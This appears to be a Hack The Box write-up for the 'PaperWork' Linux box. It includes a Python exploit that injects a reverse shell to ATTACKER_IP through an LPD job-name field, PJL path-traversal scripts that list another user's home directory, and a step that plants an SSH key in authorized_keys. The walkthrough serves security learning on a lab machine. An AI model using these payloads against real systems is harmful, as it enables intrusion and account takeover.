---
layout: post
title: "PaperWork — HTB Writeup"
box_name: PaperWork
box_icon: /assets/images/boxes/paperwork.png
os: Linux
difficulty: Easy
points: 20
retired: "2026-07-01"
tags: [printer, sockets, daemon, python]
---

`PaperWork` was a fun and straightforward machine centered around abusing Printer Job Language (`PJL`) to communicate with a printer service and gain an initial foothold. The privilege escalation was equally interesting, involving the exploitation of a `socket` misconfiguration through inherited file descriptors to obtain root. While the overall difficulty was relatively low, having to learn and work with `PJL` made the box require a bit more work and thinking.

## Recon

Starting with the basic nmap and looking around

```console
nmap -p- -vvv --min-rate 10000 <MACHINE_IP>
```

| Port  | Service |
| ------------- | ------------- |
| 22  | ssh  |
| 80  | http  |
| 1515  | ifor-protocol  |

Http on port `80` tells us there is a website being hosted, after adding the ip to our /etc/hosts file we see:


The maintenence page tells us we have to use the legacy gateway and provides us with the backend server code as well as the protocol being used.

The server code is very simple, the workflow is:
1. Accept a TCP connection.
2. Read the initial LPD command.
3. Validate the requested print queue.
4. Receive the print job's control file.
5. Extract the job name (J... field).
6. Append Archive: <job_name> to /tmp/archive.log by invoking a shell command.
7. Acknowledge success and close the connection.

If you read the code carefully, you should notice a basic command injection on the line:
```
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```
To exploit this we simply need to pass a job name and escape the string with an ' to be able to run our own command. Developing the exploit can be a bit tricky since you need to understand how LPD and RFC work, here's a good documentation that helps https://datatracker.ietf.org/doc/html/rfc1179

Reverse shell exploit:
```
import socket

TARGET = ("MACHINE_IP", 1515)
QUEUE = b"archive_intake" 
payload = "'; bash -c 'bash -i >/dev/tcp/ATTACKER_IP/PORT 0>&1'; echo '"
job_line = ("J" + payload + "\n").encode()
size = len(job_line)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(TARGET)
s.send(b"\x02" + QUEUE + b"\n")
s.send(b"\x02" + f"{size} cfA000host".encode() + b"\n")
s.send(job_line)
s.close()
```
This will give us a shell as `lp` on the machine

```
lp@paperwork:/opt/LPDServer$ id
uid=7(lp) gid=7(lp) groups=7(lp)
```


## Foothold

I ran `linpeas.sh` and confirmed that lp isn't the main user that we want, there is another user `archivist` which is the actual user we need to get to.

We can also see that there are some interesting local services running, in particular port `9100` which is used for network printing, given the printing theme this may be a possible path.

```
ss -tulnp
```
127.0.0.1:9100

`PJL` is the most popular language used to interact with printers daemons over the network. Reading through the documentation we can view the file system as well as interact with it. https://developers.hp.com/hp-printer-command-languages-pcl/doc/print-job-language-pjl

I wrote a quick program to grab its banner
<code>
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9100))
s.send(b"\x1b%-12345X@PJL INFO ID\r\n\x1b%-12345X")
print(s.recv(4096))
s.close()

</code>
It confirmed back with `b'HP LASERJET 4ML\r\n'`
I also noticed that I was able to view the file system, after messing around I was able to escape out and view `archivist` home directory

<code>
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9100))
s.send(b"\x1b%-12345X@PJL FSDIRLIST NAME=\"../\"\r\n\x1b%-12345X")
print(s.recv(4096))
s.close()
</code>

```
. TYPE=DIR
.. TYPE=DIR
.cache TYPE=DIR SIZE=4096
.bashrc TYPE=FILE SIZE=3771
.local TYPE=DIR SIZE=4096
.ssh TYPE=DIR SIZE=4096
.profile TYPE=FILE SIZE=807
.lesshst TYPE=FILE SIZE=20
.bash_history TYPE=FILE SIZE=0
user.txt TYPE=FILE SIZE=33
.bash_logout TYPE=FILE SIZE=220
.gnupg TYPE=DIR SIZE=4096
printer TYPE=DIR SIZE=4096
```

With access to his ssh keys, I was able to add my own ssh key into his authorized keys, allowing me to ssh as him

```
print(pjl(f'@PJL FSDOWNLOAD NAME="../.ssh/authorized_keys" SIZE={len(ssh_key)}\r\n{ssh_key}'))

```
## Root

Running linpeas again as `archivist` revealed a paperwork process running as root. Examining the code for the process showed that it leaks the file descriptor for the admin config file when it shares it over sockets.

All we have to do is connect to the socket and then trigger a lockdown, the python daemon will then send the file descriptor over the socket which we can access. We can then use the file descriptor to read the actual config file and retrieve the root password.d
